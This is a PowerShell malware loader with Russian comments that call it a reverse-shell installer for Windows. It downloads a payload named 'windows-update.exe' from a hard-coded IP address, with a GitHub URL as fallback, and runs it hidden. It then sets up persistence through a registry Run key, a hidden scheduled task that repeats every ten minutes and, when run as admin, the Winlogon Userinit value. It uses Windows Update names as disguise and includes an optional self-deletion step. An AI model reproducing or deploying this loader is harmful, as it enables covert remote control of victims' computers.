# win-loader.ps1 — загрузчик и установщик reverse shell для Windows
# Версия: 2.0 (оптимизированная, без дубликатов, с защитой от множественных процессов)

param([switch]$Elevated)

# === НАСТРОЙКИ ===
$LocalURL = "http://84.39.252.154:8000/windows-update.exe"
$GitHubURL = "https://raw.githubusercontent.com/1VicTim1/1234/main/windows-update.exe"
$PayloadName = "windows-update.exe"
$InstallDir = "$env:ProgramData\Microsoft\Windows\Caches"
$PayloadPath = "$InstallDir\$PayloadName"
$MutexName = "Global\WindowsUpdateSvcMutex"  # для проверки единственного экземпляра
$LogFile = "$env:ProgramData\Microsoft\Windows\Caches\loader.log"
# =================

# Функция логирования (если нужно отлаживать)
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $LogFile -Append -Encoding utf8
}

# Проверка, запущен ли уже payload
function Is-PayloadRunning {
    $proc = Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($PayloadName)) -ErrorAction SilentlyContinue
    return ($proc -ne $null)
}

# Проверка, существует ли задача в планировщике
function Task-Exists {
    param([string]$TaskName)
    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    return ($task -ne $null)
}

# Проверка, есть ли запись в реестре
function RegistryEntry-Exists {
    param([string]$Path, [string]$Name)
    $value = Get-ItemProperty -Path $Path -Name $Name -ErrorAction SilentlyContinue
    return ($value -ne $null)
}

# Создание необходимых папок
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# === ПРОВЕРКА ЕДИНСТВЕННОГО ЭКЗЕМПЛЯРА ===
try {
    $mutex = New-Object System.Threading.Mutex($false, $MutexName)
    if (-not $mutex.WaitOne(0, $false)) {
        # Другой экземпляр уже запущен
        Write-Log "Another instance already running, exiting."
        exit
    }
} catch {
    # Если не удалось создать мьютекс (например, нет прав), используем файловый замок
    $lockFile = "$env:ProgramData\Microsoft\Windows\Caches\loader.lock"
    if (Test-Path $lockFile) {
        Write-Log "Lock file exists, exiting."
        exit
    }
    New-Item -ItemType File -Path $lockFile -Force | Out-Null
}

# === ЗАГРУЗКА PAYLOAD ===
$downloaded = $false
try {
    $wc = New-Object System.Net.WebClient
    # Сначала пробуем локальный сервер
    Write-Log "Downloading from local server..."
    $wc.DownloadFile($LocalURL, $PayloadPath)
    $downloaded = $true
    Write-Log "Downloaded from local server."
} catch {
    Write-Log "Local server failed: $_"
    try {
        Write-Log "Downloading from GitHub..."
        $wc.DownloadFile($GitHubURL, $PayloadPath)
        $downloaded = $true
        Write-Log "Downloaded from GitHub."
    } catch {
        Write-Log "GitHub failed: $_"
    }
}

if (-not $downloaded) {
    Write-Log "Failed to download payload. Exiting."
    exit
}

# === ЗАПУСК PAYLOAD (только если не запущен) ===
if (-not (Is-PayloadRunning)) {
    try {
        Start-Process -FilePath $PayloadPath -WindowStyle Hidden
        Write-Log "Payload started."
    } catch {
        Write-Log "Failed to start payload: $_"
    }
} else {
    Write-Log "Payload already running, skipping start."
}

# === ДОБАВЛЕНИЕ В АВТОЗАПУСК ===

# 1. Реестр (HKCU) — не требует админа
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdateSvc"
if (-not (RegistryEntry-Exists -Path $regPath -Name $regName)) {
    try {
        Set-ItemProperty -Path $regPath -Name $regName -Value $PayloadPath -Force
        Write-Log "Added to registry (HKCU)."
    } catch {
        Write-Log "Failed to add to registry: $_"
    }
} else {
    Write-Log "Registry entry already exists."
}

# 2. Планировщик задач (не требует админа, если задача создаётся для текущего пользователя)
$taskName = "WindowsUpdateTask"
if (-not (Task-Exists -TaskName $taskName)) {
    try {
        $action = New-ScheduledTaskAction -Execute $PayloadPath
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration ([TimeSpan]::MaxValue)
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        Write-Log "Added to Task Scheduler."
    } catch {
        Write-Log "Failed to add to Task Scheduler: $_"
    }
} else {
    Write-Log "Task already exists."
}

# 3. Winlogon (только если есть права администратора)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    $winlogonPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $winlogonName = "Userinit"
    try {
        $currentUserinit = (Get-ItemProperty -Path $winlogonPath -Name $winlogonName -ErrorAction Stop).Userinit
        if ($currentUserinit -notlike "*$PayloadPath*") {
            Set-ItemProperty -Path $winlogonPath -Name $winlogonName -Value "$currentUserinit, $PayloadPath" -Force
            Write-Log "Added to Winlogon (Userinit)."
        } else {
            Write-Log "Winlogon already contains payload."
        }
    } catch {
        Write-Log "Failed to modify Winlogon: $_"
    }
} else {
    Write-Log "Not running as admin, skipping Winlogon persistence."
}

# === ОЧИСТКА ===
# Удаляем мьютекс/лок-файл, чтобы освободить ресурсы
try {
    $mutex.ReleaseMutex()
    $mutex.Close()
} catch {}
Remove-Item "$env:ProgramData\Microsoft\Windows\Caches\loader.lock" -Force -ErrorAction SilentlyContinue

# Самоуничтожение скрипта (опционально, закомментируйте если нужно сохранить)
# Start-Sleep -Seconds 5
# Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue

Write-Log "Loader finished."
exit
